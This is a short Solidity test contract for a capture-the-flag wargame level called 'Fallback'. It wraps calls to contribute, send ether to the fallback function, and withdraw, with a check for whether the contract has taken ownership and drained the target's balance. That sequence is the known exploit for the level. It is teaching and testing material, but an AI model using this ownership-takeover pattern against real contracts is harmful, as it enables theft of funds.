pragma solidity ^0.6.0;

import '1_Fallback.sol';

contract Test {
    Fallback level;

    constructor() public payable { 
        level = Fallback(0xc1FDdD8C8E57a10419A01b1aEC2f4F4F64A2393f);
    }
  
    function test_contribute() external payable {
        level.contribute.value(msg.value)(); 
    }

    function test_withdraw() external  {
        level.withdraw();
    }

    function test_fallback() external payable {
        address(level).call.value(msg.value)(""); 
    }
    
    function test_hacked() public returns (bool) {
        //To beat the level you needed to become the owner and withdraw the balance
        assert(!(level.owner() == address(this) && address(level).balance == 0));
    }

    receive() external payable {}
}
